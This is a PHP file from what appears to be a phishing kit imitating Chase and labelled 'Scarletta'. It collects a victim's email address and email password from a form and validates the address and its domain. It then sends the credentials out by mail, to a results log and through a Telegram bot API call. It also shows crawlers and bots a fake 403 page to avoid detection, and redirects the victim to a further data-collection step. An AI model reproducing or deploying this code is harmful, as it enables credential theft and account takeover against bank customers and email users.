<?php

$settings = include '../../../settings/settings.php';

# Cookie

if(!isset($_COOKIE['logged_in']) || $_COOKIE['logged_in'] == "0"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}

# Debug 

if($settings['debug'] == "1"){
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
  error_reporting(E_ALL);
}
$bot = include '../../Bots/bot.php';
if($bot == "is_bot"){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
ini_set('allow_url_fopen',1);

#$settings = include('../../settings/settings.php');

session_start();

# Debug

if($settings['debug'] == "1"){
  ini_set('display_errors', 1);
  ini_set('display_startup_errors', 1);
};

# User Agent

$useragent = $_SERVER['HTTP_USER_AGENT'];

# Anti Bots 

include("../../Bots/Anti/out/Crawler/src/CrawlerDetect.php");


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../Logs/client.txt");

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

if($CrawlerDetect->isCrawler($useragent)){
  header("HTTP/1.0 404 Not Found");
  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}



$email = $_POST['email'];
$epass = $_POST['email_p'];
if(filter_var($email, FILTER_VALIDATE_EMAIL)){
  $email_val = "VALID ✅";
} else {
  $email_val = "INVALID ❌";
}
$domain_temp = explode("@",$email);
$domain = $domain_temp[1];
if(checkdnsrr($domain)){
  $domain_val = "VALID ✅";
} else {
  $domain_val = "INVALID ❌";
}


$message = "==== 📧 [ EMAIL & ADDRESS DETAILS | SCARLETTA | CLIENT {$client} ] 📧 ====\n";
$message .= "|-------------------------------------|\n";
$message .= "| ➤ [ Email ]      : {$email}\n";
$message .= "| ➤ [ Email Password ] : {$epass}\n";
$message .= "| ➤ [ Email Check    : {$email_val}\n";
$message .= "| ➤ [ Domain Check   : {$domain_val}\n";
$message .= "|-------------------------------------|\n";


if ($settings['send_mail'] == "1"){
  $to = $owner;
  $client = file_get_contents("../../../Logs/client.txt");
  $headers = "Content-type:text/plain;charset=UTF-8\r\n";
  $headers .= "From: Scarletta <chase@client_{$client}_site.com>\r\n";
  $subject = "⚔️ C A R D ✦ D E T A I L S ✦ C H A S E #{$client} ⚔️";
  $msg = $message;
  mail($to, $subject, $msg, $headers);
}

if ($settings['save_results'] == "1"){
  $results = fopen($filename, "a+");
  fwrite($results, $message);
  fclose($results);
}

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}


# Head Back To Next Step
echo "<script>window.location.href = "."\"name.php\"; </script>";
?>